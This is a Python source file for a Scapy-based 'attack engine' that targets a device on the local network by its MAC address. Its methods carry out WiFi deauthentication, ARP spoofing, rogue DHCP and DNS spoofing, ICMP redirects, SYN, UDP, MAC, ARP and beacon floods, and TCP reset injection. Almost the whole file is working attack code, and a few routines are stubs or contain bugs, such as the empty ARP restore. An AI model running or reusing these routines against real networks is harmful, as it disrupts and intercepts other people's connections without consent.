"""Scapy-based attack engine (Real implementation)."""

import asyncio
import contextlib
import logging
import os
import subprocess
import sys
import time
from ipaddress import ip_network
from typing import ClassVar

from scapy.all import (
    ARP,
    BOOTP,
    DHCP,
    DNS,
    DNSRR,
    ICMP,
    IP,
    TCP,
    UDP,
    Dot11,
    Dot11Beacon,
    Dot11Deauth,
    Dot11Elt,
    Ether,
    RadioTap,
    conf,
    get_if_addr,
    get_if_hwaddr,
    send,
    sendp,
    sniff,
)

from app.core.engine.base import AttackEngine
from app.models.attack import AttackType

logger = logging.getLogger(__name__)


class ScapyAttackEngine(AttackEngine):
    """Attack engine using Scapy for packet injection."""

    # Track running attack flags: mac -> bool (True = running)
    _running_attacks: ClassVar[dict[str, bool]] = {}

    def check_permissions(self) -> bool:
        """
        Check if we have permissions for Scapy raw sockets.
        Requires either:
        - Root user (UID 0), or
        - NET_RAW capability (Linux with capabilities)
        """
        try:
            # Check if running as root
            if os.geteuid() == 0:
                return True
            # On Linux, check for NET_RAW capability via /proc/self/status
            # This works even in Docker containers with NET_RAW capability
            try:
                with open("/proc/self/status") as f:
                    for line in f:
                        if line.startswith("CapEff:"):
                            # Parse capability effective set (hex)
                            cap_eff = int(line.split()[1], 16)
                            # NET_RAW is capability 13 (bit 13)
                            # Check if bit 13 is set: (cap_eff >> 13) & 1
                            if (cap_eff >> 13) & 1:
                                return True
            except (FileNotFoundError, PermissionError, ValueError):
                pass
            return False
        except AttributeError:
            # Windows/macOS - check for admin privileges
            if sys.platform == "win32":
                try:
                    import ctypes

                    return ctypes.windll.shell32.IsUserAnAdmin() != 0
                except Exception:
                    return False
            # macOS - assume no raw socket support without root
            return False

    async def start_attack(
        self, target_mac: str, attack_type: AttackType, duration: int
    ) -> None:
        """Start an attack using Scapy."""
        if not self.check_permissions():
            logger.error("Scapy engine requires root/admin privileges.")
            raise PermissionError("Root/Admin required for Scapy engine")

        self._running_attacks[target_mac] = True

        try:
            if attack_type == AttackType.KICK:
                await self._run_kick_attack(target_mac, duration)
            elif attack_type == AttackType.BLOCK:
                await self._run_block_attack(target_mac, duration)
            elif attack_type == AttackType.DHCP_SPOOF:
                await self._run_dhcp_spoof_attack(target_mac, duration)
            elif attack_type == AttackType.DNS_SPOOF:
                await self._run_dns_spoof_attack(target_mac, duration)
            elif attack_type == AttackType.ICMP_REDIRECT:
                await self._run_icmp_redirect_attack(target_mac, duration)
            elif attack_type == AttackType.PORT_SCAN:
                await self._run_port_scan_attack(target_mac, duration)
            elif attack_type == AttackType.TRAFFIC_SHAPE:
                await self._run_traffic_shape_attack(target_mac, duration)
            elif attack_type == AttackType.MAC_FLOOD:
                await self._run_mac_flood_attack(target_mac, duration)
            elif attack_type == AttackType.BEACON_FLOOD:
                await self._run_beacon_flood_attack(target_mac, duration)
            elif attack_type == AttackType.SYN_FLOOD:
                await self._run_syn_flood_attack(target_mac, duration)
            elif attack_type == AttackType.UDP_FLOOD:
                await self._run_udp_flood_attack(target_mac, duration)
            elif attack_type == AttackType.TCP_RST:
                await self._run_tcp_rst_attack(target_mac, duration)
            elif attack_type == AttackType.ARP_FLOOD:
                await self._run_arp_flood_attack(target_mac, duration)
            else:
                logger.warning(f"Unknown attack type: {attack_type}")
        finally:
            self._running_attacks.pop(target_mac, None)

    async def stop_attack(self, target_mac: str) -> None:
        """Stop the attack."""
        if target_mac in self._running_attacks:
            logger.info(f"[ScapyEngine] Stopping attack on {target_mac}")
            self._running_attacks[target_mac] = False
        else:
            logger.debug(
                f"[ScapyEngine] No active attack found for {target_mac} to stop"
            )

    async def scan_network(
        self, target_subnet: str | None = None
    ) -> list[tuple[str, str]]:
        """
        Perform an ARP scan on the local network.
        Returns list of (IP, MAC) tuples.
        Platform-aware implementation for Linux, macOS, and Windows.
        """
        if not self.check_permissions():
            logger.warning(
                "Scapy scan requires root/admin. Falling back to passive/table scan."
            )
            return []

        logger.info("[ScapyEngine] Starting active ARP scan...")

        try:
            import sys

            from app.core.engine.features_macos import MacOSNetworkFeatures

            # Use provided subnet if available, otherwise detect
            subnet = target_subnet
            gw_ip = None
            iface = None

            # If subnet provided, extract gateway from it
            if subnet:
                try:
                    import ipaddress

                    network = ipaddress.IPv4Network(subnet, strict=False)
                    # Common gateway: .1 or .254
                    gw_ip = str(network.network_address + 1)
                    logger.info(f"[ScapyEngine] Using provided subnet: {subnet}")
                except Exception as e:
                    logger.warning(f"[ScapyEngine] Invalid subnet {subnet}: {e}")
                    subnet = None

            # Platform-specific gateway detection (if subnet not provided)
            if not subnet:
                if sys.platform == "darwin":
                    # macOS-specific detection
                    macos_features = MacOSNetworkFeatures()
                    gw_ip = await macos_features.get_gateway_ip()
                    iface = await macos_features.get_default_interface()

                    if iface and gw_ip:
                        # Get subnet mask and calculate CIDR
                        mask = await macos_features.get_subnet_mask(iface)
                        subnet = await macos_features.calculate_subnet(gw_ip, mask)
                elif sys.platform == "win32":
                    # Windows-specific detection
                    try:
                        # Use ipconfig to get default gateway on Windows
                        # Note: asyncio is already imported at module level
                        result = await asyncio.create_subprocess_exec(
                            "ipconfig",
                            stdout=asyncio.subprocess.PIPE,
                            stderr=asyncio.subprocess.PIPE,
                            creationflags=(
                                subprocess.CREATE_NO_WINDOW
                                if sys.platform == "win32"
                                else 0
                            ),
                        )
                        stdout, _ = await asyncio.wait_for(
                            result.communicate(), timeout=5.0
                        )
                        output = stdout.decode("utf-8", errors="ignore")

                        # Parse gateway from ipconfig output
                        # Format: Default Gateway . . . . . . . . . : 192.168.1.1
                        for line in output.splitlines():
                            if "Default Gateway" in line or "默认网关" in line:
                                parts = line.split(":")
                                if len(parts) >= 2:
                                    gw_ip = parts[-1].strip()
                                    break

                        # Get interface from route table
                        try:
                            gw_route = conf.route.route("0.0.0.0")
                            iface = gw_route[3]  # Interface name
                        except Exception:
                            # Fallback: use first available interface
                            iface = (
                                list(conf.ifaces.values())[0].name
                                if conf.ifaces
                                else None
                            )

                    except Exception as e:
                        logger.warning(
                            f"[ScapyEngine] Failed to determine gateway on Windows: {e}"
                        )
                else:
                    # Linux detection (original logic)
                    try:
                        gw_route = conf.route.route("0.0.0.0")
                        gw_ip = gw_route[2]
                        if not gw_ip or gw_ip == "0.0.0.0":
                            gw_route = conf.route.route("8.8.8.8")
                            gw_ip = gw_route[2]
                        iface = conf.iface
                    except Exception as e:
                        logger.warning(
                            f"[ScapyEngine] Failed to determine gateway via route: {e}"
                        )
                        gw_ip = None

                if not gw_ip:
                    logger.warning("Could not determine gateway IP for scan.")
                    return []

                # Calculate /24 subnet from gateway IP
                if not subnet and gw_ip:
                    # Extract first 3 octets and form /24 network
                    octets = gw_ip.split(".")
                    if len(octets) == 4:
                        subnet = f"{octets[0]}.{octets[1]}.{octets[2]}.0/24"
                        logger.info(f"Calculated subnet from gateway {gw_ip}: {subnet}")

            logger.info(f"[ScapyEngine] Scanning subnet {subnet} on interface {iface}")

            # Let's use the blocking srp call in thread
            def _arp_scan():
                from scapy.all import srp

                # srp sends and receives at layer 2
                # On macOS, use the detected interface explicitly
                scan_iface = iface if iface else conf.iface
                logger.debug(f"[ScapyEngine] Using interface: {scan_iface}")

                ans, _ = srp(
                    Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet),
                    timeout=2,
                    verbose=False,
                    iface=scan_iface,
                )
                results = []
                for _snd, rcv in ans:
                    results.append((rcv.psrc, rcv.hwsrc))
                return results

            return await asyncio.to_thread(_arp_scan)

        except Exception as e:
            logger.error(f"[ScapyEngine] ARP scan failed: {e}", exc_info=True)
            return []

    async def _run_kick_attack(self, target_mac: str, duration: int) -> None:
        """
        Execute WiFi Deauthentication attack.
        Requires monitor mode interface.
        """
        logger.info(f"[ScapyEngine] Starting Deauth attack on {target_mac}")

        # Detect monitor interface (simplistic detection)
        iface = conf.iface
        # Note: Monitor mode detection is platform-specific and complex.
        # Current implementation assumes default interface supports injection
        # or user has configured a monitor-mode interface as default.
        # For production use, consider explicit interface configuration.

        # Construct Deauth frame
        # Reason 7: Class 3 frame received from nonassociated station
        pkt = (
            RadioTap()
            / Dot11(
                addr1=target_mac, addr2=get_if_hwaddr(iface), addr3=get_if_hwaddr(iface)
            )
            / Dot11Deauth(reason=7)
        )

        end_time = time.time() + duration

        while time.time() < end_time:
            if not self._running_attacks.get(target_mac):
                logger.info(f"[ScapyEngine] Deauth attack on {target_mac} aborted")
                break

            # Check for cancellation periodically
            try:
                # Send burst of packets
                # Run in thread to avoid blocking event loop, with timeout
                await asyncio.wait_for(
                    asyncio.to_thread(
                        sendp, pkt, iface=iface, count=5, inter=0.1, verbose=False
                    ),
                    timeout=2.0,
                )
            except TimeoutError:
                logger.warning("[ScapyEngine] Packet send timed out, continuing...")
            except Exception as e:
                logger.error(f"[ScapyEngine] Error sending packet: {e}")
                # Continue even if one packet fails

            # Sleep a bit to allow other tasks (check cancellation more frequently)
            await asyncio.sleep(1)

    async def _run_block_attack(self, target_mac: str, duration: int) -> None:
        """
        Execute ARP Spoofing attack (Man-in-the-Middle / Denial of Service).
        Tells target that I am the gateway.
        """
        logger.info(f"[ScapyEngine] Starting ARP Spoof/Block attack on {target_mac}")

        try:
            # Get gateway IP
            # conf.route.route("0.0.0.0")[2] returns default gateway IP
            gateway_ip = conf.route.route("0.0.0.0")[2]
            iface = conf.iface
            my_mac = get_if_hwaddr(iface)

            # 1. Spoof Target: "Gateway is at My MAC"
            # This causes target to send traffic to us.
            # If we don't forward, it's a block (DoS).
            # If we forward, it's MitM. Here we just want to BLOCK (Interfere).
            # Create ARP packet with Ether layer to specify destination MAC
            # op=2 means ARP reply (is-at)
            arp_packet = ARP(
                op=2,  # ARP reply
                pdst=gateway_ip,  # Target thinks gateway is asking
                psrc=gateway_ip,  # Spoofed source IP (gateway)
                hwdst=target_mac,  # Target MAC (destination)
                hwsrc=my_mac,  # Our MAC (spoofed as gateway)
            )
            # Wrap in Ether layer with target MAC as destination
            packet = Ether(dst=target_mac, src=my_mac) / arp_packet

            end_time = time.time() + duration

            while time.time() < end_time:
                if not self._running_attacks.get(target_mac):
                    logger.info(f"[ScapyEngine] ARP attack on {target_mac} aborted")
                    break

                # Check for cancellation periodically
                try:
                    # Send spoof packet with timeout using sendp (layer 2)
                    await asyncio.wait_for(
                        asyncio.to_thread(sendp, packet, iface=iface, verbose=False),
                        timeout=2.0,
                    )
                except TimeoutError:
                    logger.warning(
                        "[ScapyEngine] ARP packet send timed out, continuing..."
                    )
                except Exception as e:
                    logger.error(f"[ScapyEngine] Error sending ARP packet: {e}")
                    # Continue even if one packet fails

                # Sleep interval (ARP cache timeout is usually 60s,
                # but we spam every 2s to be sure)
                await asyncio.sleep(2)

        except Exception as e:
            logger.error(f"[ScapyEngine] ARP attack failed: {e}")
            raise

        finally:
            # Restore ARP tables (Re-ARP)
            logger.info(f"[ScapyEngine] Restoring ARP table for {target_mac}")
            try:
                # Tell target the real gateway MAC
                # We might not know real gateway MAC easily without scanning,
                # so we broadcast or just stop spoofing.
                # For proper restore, we'd need gateway MAC.
                # Here we simply stop interfering.
                pass
            except Exception as e:
                logger.error(f"[ScapyEngine] Failed to restore ARP: {e}")

    async def _run_dhcp_spoof_attack(self, target_mac: str, duration: int) -> None:
        """
        Execute DHCP Spoofing attack.
        Responds to DHCP requests with malicious DHCP offers.
        """
        logger.info(f"[ScapyEngine] Starting DHCP Spoof attack on {target_mac}")

        try:
            iface = conf.iface
            my_mac = get_if_hwaddr(iface)

            # Get gateway IP
            gateway_ip = conf.route.route("0.0.0.0")[2]
            # Use a different IP for the fake DHCP server
            fake_dhcp_ip = gateway_ip  # Or use a controlled IP

            end_time = time.time() + duration

            # Sniff for DHCP requests and respond with spoofed offers
            def handle_dhcp(packet):
                if DHCP in packet and packet[DHCP].options[0][1] == 1:  # DHCP Discover
                    # Create spoofed DHCP Offer
                    offer = (
                        Ether(dst=packet[Ether].src, src=my_mac)
                        / IP(src=fake_dhcp_ip, dst=packet[IP].dst)
                        / UDP(sport=67, dport=68)
                        / BOOTP(
                            op=2,  # BOOTP reply
                            xid=packet[BOOTP].xid,
                            yiaddr=packet[IP].dst,  # Offer this IP
                            siaddr=fake_dhcp_ip,
                            chaddr=packet[BOOTP].chaddr,
                        )
                        / DHCP(
                            options=[
                                ("message-type", "offer"),
                                ("server_id", fake_dhcp_ip),
                                ("lease_time", 3600),
                                ("subnet_mask", "255.255.255.0"),
                                ("router", fake_dhcp_ip),  # Redirect gateway
                                ("name_server", fake_dhcp_ip),  # Redirect DNS
                                "end",
                            ]
                        )
                    )
                    sendp(offer, iface=iface, verbose=False)

            # Start sniffing in background
            sniff_task = asyncio.create_task(
                asyncio.to_thread(
                    sniff,
                    filter="udp and port 67",
                    prn=handle_dhcp,
                    stop_filter=lambda x: time.time() >= end_time,
                    timeout=duration,
                )
            )

            while time.time() < end_time:
                if not self._running_attacks.get(target_mac):
                    logger.info(
                        f"[ScapyEngine] DHCP Spoof attack on {target_mac} aborted"
                    )
                    break
                await asyncio.sleep(1)

            sniff_task.cancel()

        except Exception as e:
            logger.error(f"[ScapyEngine] DHCP Spoof attack failed: {e}")
            raise

    async def _run_dns_spoof_attack(self, target_mac: str, duration: int) -> None:
        """
        Execute DNS Spoofing attack.
        Intercepts DNS queries and responds with malicious IPs.
        """
        logger.info(f"[ScapyEngine] Starting DNS Spoof attack on {target_mac}")

        try:
            iface = conf.iface
            my_mac = get_if_hwaddr(iface)

            # Get target IP from ARP table or device state
            # For now, we'll use a generic approach
            redirect_ip = "127.0.0.1"  # Redirect to localhost (block)

            end_time = time.time() + duration

            def handle_dns(packet):
                try:
                    if DNS in packet and packet[DNS].qr == 0:  # DNS Query
                        # Validate we have the required fields
                        if not packet[DNS].qd:
                            return

                        qname = packet[DNS].qd.qname
                        qtype = (
                            packet[DNS].qd.qtype
                            if hasattr(packet[DNS].qd, "qtype")
                            else 1
                        )

                        # Create spoofed DNS response using DNSRR (Resource Record)
                        # DNSRR is for answers, DNSQR is for questions
                        spoofed_dns = (
                            Ether(dst=packet[Ether].src, src=my_mac)
                            / IP(src=packet[IP].dst, dst=packet[IP].src)
                            / UDP(sport=packet[UDP].dport, dport=packet[UDP].sport)
                            / DNS(
                                id=packet[DNS].id,
                                qr=1,  # Response
                                aa=1,  # Authoritative answer
                                rd=packet[DNS].rd,  # Recursion desired (echo)
                                ra=1,  # Recursion available
                                ancount=1,  # One answer
                                qd=packet[DNS].qd,  # Echo the question
                                an=DNSRR(
                                    rrname=qname,
                                    type=qtype,
                                    ttl=300,  # 5 minutes TTL
                                    rdata=redirect_ip,
                                ),
                            )
                        )
                        sendp(spoofed_dns, iface=iface, verbose=False)
                        logger.debug(
                            f"[ScapyEngine] DNS spoofed: {qname} -> {redirect_ip}"
                        )
                except Exception as e:
                    logger.debug(f"[ScapyEngine] DNS handle error: {e}")

            # Start sniffing DNS queries
            sniff_task = asyncio.create_task(
                asyncio.to_thread(
                    sniff,
                    filter="udp and port 53",
                    prn=handle_dns,
                    stop_filter=lambda x: time.time() >= end_time,
                    timeout=duration,
                )
            )

            while time.time() < end_time:
                if not self._running_attacks.get(target_mac):
                    logger.info(
                        f"[ScapyEngine] DNS Spoof attack on {target_mac} aborted"
                    )
                    break
                await asyncio.sleep(1)

            sniff_task.cancel()

        except Exception as e:
            logger.error(f"[ScapyEngine] DNS Spoof attack failed: {e}")
            raise

    async def _run_icmp_redirect_attack(self, target_mac: str, duration: int) -> None:
        """
        Execute ICMP Redirect attack.
        Sends ICMP redirect messages to manipulate routing.
        """
        logger.info(f"[ScapyEngine] Starting ICMP Redirect attack on {target_mac}")

        try:
            iface = conf.iface
            my_mac = get_if_hwaddr(iface)
            gateway_ip = conf.route.route("0.0.0.0")[2]

            # Get target IP (simplified - would need device lookup)
            # For now, we'll redirect to our own IP
            redirect_to_ip = conf.iface.ip

            end_time = time.time() + duration

            while time.time() < end_time:
                if not self._running_attacks.get(target_mac):
                    logger.info(
                        f"[ScapyEngine] ICMP Redirect attack on {target_mac} aborted"
                    )
                    break

                # Send ICMP redirect message
                # Redirect type 5: Redirect datagram for the Network
                redirect_packet = (
                    Ether(dst=target_mac, src=my_mac)
                    / IP(src=gateway_ip, dst=target_mac)
                    / ICMP(type=5, code=1, gw=redirect_to_ip)  # Redirect for host
                    / IP(src=target_mac, dst="8.8.8.8")  # Original packet
                    / ICMP(type=8)  # Echo request
                )

                try:
                    await asyncio.wait_for(
                        asyncio.to_thread(
                            sendp, redirect_packet, iface=iface, verbose=False
                        ),
                        timeout=2.0,
                    )
                except TimeoutError:
                    logger.warning("[ScapyEngine] ICMP Redirect packet send timed out")
                except Exception as e:
                    logger.error(f"[ScapyEngine] Error sending ICMP Redirect: {e}")

                await asyncio.sleep(5)  # Send every 5 seconds

        except Exception as e:
            logger.error(f"[ScapyEngine] ICMP Redirect attack failed: {e}")
            raise

    async def _run_port_scan_attack(self, target_mac: str, duration: int) -> None:
        """
        Execute Port Scanning (reconnaissance).
        Scans common ports on the target device.
        """
        logger.info(f"[ScapyEngine] Starting Port Scan on {target_mac}")

        try:
            # Get target IP from device state or ARP table
            # For now, we'll use a placeholder
            target_ip = None  # Would need to resolve from MAC

            if not target_ip:
                logger.warning(
                    f"[ScapyEngine] Cannot resolve IP for {target_mac}, "
                    f"skipping port scan"
                )
                return

            # Common ports to scan
            common_ports = [22, 23, 80, 443, 8080, 3389, 5900]

            end_time = time.time() + duration
            scanned = set()

            while time.time() < end_time and len(scanned) < len(common_ports):
                if not self._running_attacks.get(target_mac):
                    logger.info(f"[ScapyEngine] Port Scan on {target_mac} aborted")
                    break

                for port in common_ports:
                    if port in scanned:
                        continue

                    # Send SYN packet
                    syn_packet = IP(dst=target_ip) / TCP(dport=port, flags="S")

                    try:
                        await asyncio.wait_for(
                            asyncio.to_thread(send, syn_packet, verbose=False),
                            timeout=1.0,
                        )
                        scanned.add(port)
                    except Exception as e:
                        logger.debug(f"[ScapyEngine] Port scan error for {port}: {e}")

                    await asyncio.sleep(0.5)  # Rate limit

        except Exception as e:
            logger.error(f"[ScapyEngine] Port Scan failed: {e}")
            raise

    async def _run_traffic_shape_attack(self, target_mac: str, duration: int) -> None:
        """
        Execute Traffic Shaping (bandwidth limiting).
        Uses iptables/tc to limit bandwidth for the target.
        """
        logger.info(f"[ScapyEngine] Starting Traffic Shaping on {target_mac}")

        # Traffic shaping is typically done at the OS level, not via Scapy
        # This would require iptables/tc commands
        # For now, we log that it would be applied
        logger.info(
            f"[ScapyEngine] Traffic shaping for {target_mac} "
            f"would be applied via iptables/tc"
        )

        # In a real implementation, this would:
        # 1. Get target IP from MAC
        # 2. Apply iptables/tc rules to limit bandwidth
        # 3. Monitor and adjust

        end_time = time.time() + duration

        while time.time() < end_time:
            if not self._running_attacks.get(target_mac):
                logger.info(f"[ScapyEngine] Traffic Shaping on {target_mac} aborted")
                break
            await asyncio.sleep(1)

    async def _run_mac_flood_attack(self, target_mac: str, duration: int) -> None:
        """
        Execute MAC Flooding attack.
        Floods switch CAM table with fake MAC addresses.
        """
        logger.info(f"[ScapyEngine] Starting MAC Flood attack on {target_mac}")

        try:
            iface = conf.iface

            import random

            end_time = time.time() + duration

            while time.time() < end_time:
                if not self._running_attacks.get(target_mac):
                    logger.info(
                        f"[ScapyEngine] MAC Flood attack on {target_mac} aborted"
                    )
                    break

                # Generate random MAC addresses
                fake_mac = ":".join([f"{random.randint(0, 255):02x}" for _ in range(6)])

                # Send packet with fake source MAC
                flood_packet = Ether(src=fake_mac, dst=target_mac) / IP() / ICMP()

                try:
                    await asyncio.wait_for(
                        asyncio.to_thread(
                            sendp, flood_packet, iface=iface, verbose=False
                        ),
                        timeout=0.1,
                    )
                except Exception:
                    pass  # Ignore errors in flooding

                await asyncio.sleep(0.01)  # High rate

        except Exception as e:
            logger.error(f"[ScapyEngine] MAC Flood attack failed: {e}")
            raise

    async def _run_beacon_flood_attack(self, target_mac: str, duration: int) -> None:
        """
        Execute WiFi Beacon Flood attack.
        Floods the area with fake AP beacons to confuse clients.
        """
        logger.info(f"[ScapyEngine] Starting Beacon Flood attack on {target_mac}")

        try:
            iface = conf.iface

            import random
            import string

            end_time = time.time() + duration

            while time.time() < end_time:
                if not self._running_attacks.get(target_mac):
                    logger.info(
                        f"[ScapyEngine] Beacon Flood attack on {target_mac} aborted"
                    )
                    break

                # Generate random SSID
                fake_ssid = "".join(
                    random.choices(string.ascii_letters + string.digits, k=8)
                )
                fake_bssid = ":".join(
                    [f"{random.randint(0, 255):02x}" for _ in range(6)]
                )

                # Create beacon frame
                # Dot11Elt is used for Information Elements (IE) like SSID
                beacon = (
                    RadioTap()
                    / Dot11(
                        type=0,
                        subtype=8,  # Management, Beacon
                        addr1="ff:ff:ff:ff:ff:ff",  # Broadcast
                        addr2=fake_bssid,
                        addr3=fake_bssid,
                    )
                    / Dot11Beacon(cap=0x1104)
                    / Dot11Elt(ID="SSID", info=fake_ssid)  # SSID Information Element
                )

                try:
                    await asyncio.wait_for(
                        asyncio.to_thread(sendp, beacon, iface=iface, verbose=False),
                        timeout=0.1,
                    )
                except Exception as e:
                    logger.debug(f"[ScapyEngine] Beacon send error: {e}")

                await asyncio.sleep(0.1)  # Send beacons rapidly

        except Exception as e:
            logger.error(f"[ScapyEngine] Beacon Flood attack failed: {e}")
            raise

    async def _run_syn_flood_attack(self, target_mac: str, duration: int) -> None:
        """
        Execute SYN Flood attack.
        Floods target with TCP SYN packets to exhaust connection resources.
        """
        logger.info(f"[ScapyEngine] Starting SYN Flood attack on {target_mac}")

        try:
            # Get target IP from state manager or ARP resolution
            # For now, we'll need to resolve MAC to IP
            target_ip = await self._resolve_mac_to_ip(target_mac)
            if not target_ip:
                logger.warning(f"[ScapyEngine] Cannot resolve IP for {target_mac}")
                return

            import random

            end_time = time.time() + duration
            common_ports = [80, 443, 8080, 22, 23, 3389]  # Common service ports

            while time.time() < end_time:
                if not self._running_attacks.get(target_mac):
                    logger.info(
                        f"[ScapyEngine] SYN Flood attack on {target_mac} aborted"
                    )
                    break

                # Send SYN packets to multiple ports with random source ports
                for dport in common_ports:
                    sport = random.randint(1024, 65535)
                    syn_packet = IP(dst=target_ip) / TCP(
                        sport=sport,
                        dport=dport,
                        flags="S",  # SYN flag
                        seq=random.randint(1000, 100000),
                    )

                    try:
                        await asyncio.wait_for(
                            asyncio.to_thread(send, syn_packet, verbose=False),
                            timeout=0.1,
                        )
                    except Exception as e:
                        logger.debug(f"[ScapyEngine] SYN packet send error: {e}")

                await asyncio.sleep(0.01)  # High rate (100 pps)

        except Exception as e:
            logger.error(f"[ScapyEngine] SYN Flood attack failed: {e}")
            raise

    async def _run_udp_flood_attack(self, target_mac: str, duration: int) -> None:
        """
        Execute UDP Flood attack.
        Floods target with UDP packets to exhaust bandwidth and resources.
        """
        logger.info(f"[ScapyEngine] Starting UDP Flood attack on {target_mac}")

        try:
            target_ip = await self._resolve_mac_to_ip(target_mac)
            if not target_ip:
                logger.warning(f"[ScapyEngine] Cannot resolve IP for {target_mac}")
                return

            import random

            end_time = time.time() + duration
            common_udp_ports = [53, 123, 161, 1900]  # DNS, NTP, SNMP, SSDP

            while time.time() < end_time:
                if not self._running_attacks.get(target_mac):
                    logger.info(
                        f"[ScapyEngine] UDP Flood attack on {target_mac} aborted"
                    )
                    break

                # Send UDP packets with random payload
                for dport in common_udp_ports:
                    sport = random.randint(1024, 65535)
                    payload = bytes([random.randint(0, 255) for _ in range(512)])
                    udp_packet = (
                        IP(dst=target_ip) / UDP(sport=sport, dport=dport) / payload
                    )

                    try:
                        await asyncio.wait_for(
                            asyncio.to_thread(send, udp_packet, verbose=False),
                            timeout=0.1,
                        )
                    except Exception as e:
                        logger.debug(f"[ScapyEngine] UDP packet send error: {e}")

                await asyncio.sleep(0.01)  # High rate

        except Exception as e:
            logger.error(f"[ScapyEngine] UDP Flood attack failed: {e}")
            raise

    async def _run_tcp_rst_attack(self, target_mac: str, duration: int) -> None:
        """
        Execute TCP RST injection attack.
        Monitors connections and injects RST packets to terminate them.
        """
        logger.info(f"[ScapyEngine] Starting TCP RST attack on {target_mac}")

        try:
            target_ip = await self._resolve_mac_to_ip(target_mac)
            if not target_ip:
                logger.warning(f"[ScapyEngine] Cannot resolve IP for {target_mac}")
                return

            iface = conf.iface
            end_time = time.time() + duration

            def inject_rst(packet):
                """Inject RST for intercepted TCP packets."""
                if TCP in packet and IP in packet:
                    # Only target packets from/to our target
                    if packet[IP].src == target_ip or packet[IP].dst == target_ip:
                        try:
                            # Craft RST packet
                            if packet[TCP].flags & 0x02:  # SYN flag
                                # Respond to SYN with RST
                                rst = IP(src=packet[IP].dst, dst=packet[IP].src) / TCP(
                                    sport=packet[TCP].dport,
                                    dport=packet[TCP].sport,
                                    flags="RA",  # RST+ACK per RFC 793
                                    seq=packet[TCP].ack or 0,
                                    ack=packet[TCP].seq + 1,
                                )
                                send(rst, verbose=False)
                        except Exception as e:
                            logger.debug(f"[ScapyEngine] RST inject error: {e}")

            # Sniff and inject RST packets
            sniff_task = asyncio.create_task(
                asyncio.to_thread(
                    sniff,
                    filter=f"tcp and host {target_ip}",
                    prn=inject_rst,
                    stop_filter=lambda x: time.time() >= end_time,
                    timeout=duration,
                    iface=iface,
                )
            )

            try:
                while time.time() < end_time:
                    if not self._running_attacks.get(target_mac):
                        logger.info(
                            f"[ScapyEngine] TCP RST attack on {target_mac} aborted"
                        )
                        sniff_task.cancel()
                        break
                    await asyncio.sleep(1)

                with contextlib.suppress(asyncio.CancelledError):
                    await sniff_task
            finally:
                if not sniff_task.done():
                    sniff_task.cancel()
                    with contextlib.suppress(asyncio.CancelledError):
                        await sniff_task

        except Exception as e:
            logger.error(f"[ScapyEngine] TCP RST attack failed: {e}")
            raise

    async def _run_arp_flood_attack(self, target_mac: str, duration: int) -> None:
        """
        Execute ARP Flood attack.
        Floods network with ARP requests to stress ARP tables.
        """
        logger.info(f"[ScapyEngine] Starting ARP Flood attack on {target_mac}")

        try:
            iface = conf.iface
            my_mac = get_if_hwaddr(iface)
            network = None

            try:
                iface_ip = get_if_addr(iface)
                from scapy.arch.common import get_if_netmask

                netmask = get_if_netmask(iface)
                if iface_ip:
                    network = ip_network(f"{iface_ip}/{netmask}", strict=False)
            except Exception as e:
                logger.debug(f"[ScapyEngine] Could not derive subnet: {e}")

            if network is None:
                # Fallback to private /16 to keep ARP flood local
                network = ip_network("192.168.0.0/16")

            import random

            end_time = time.time() + duration

            def random_ip_in_network(net):
                if net.num_addresses <= 2:
                    return str(net.network_address)
                max_offset = net.num_addresses - 2
                offset = random.randint(1, max_offset)
                return str(net.network_address + offset)

            while time.time() < end_time:
                if not self._running_attacks.get(target_mac):
                    logger.info(
                        f"[ScapyEngine] ARP Flood attack on {target_mac} aborted"
                    )
                    break

                # Generate random IP addresses
                fake_ip = random_ip_in_network(network)
                target_ip = random_ip_in_network(network)

                # Send ARP who-has request
                arp_request = Ether(dst="ff:ff:ff:ff:ff:ff", src=my_mac) / ARP(
                    op=1,  # ARP request
                    hwsrc=my_mac,
                    psrc=fake_ip,
                    pdst=target_ip,
                )

                try:
                    await asyncio.wait_for(
                        asyncio.to_thread(
                            sendp, arp_request, iface=iface, verbose=False
                        ),
                        timeout=0.1,
                    )
                except Exception as e:
                    logger.debug(f"[ScapyEngine] ARP flood send error: {e}")

                await asyncio.sleep(0.01)  # High rate (100 pps)

        except Exception as e:
            logger.error(f"[ScapyEngine] ARP Flood attack failed: {e}")
            raise

    async def _resolve_mac_to_ip(self, mac: str) -> str | None:
        """Resolve MAC address to IP address from state manager or ARP table.

        Args:
            mac: Target MAC address

        Returns:
            IP address string or None if not found
        """
        try:
            from app.services.state import get_state_manager

            state = get_state_manager()
            device = state.get_device(mac)
            if device and device.ip:
                return str(device.ip)

            # Fallback: scan ARP table (platform-specific)
            # For now, return None if not in state
            logger.warning(f"[ScapyEngine] Could not resolve IP for {mac}")
            return None
        except Exception as e:
            logger.error(f"[ScapyEngine] MAC to IP resolution failed: {e}")
            return None
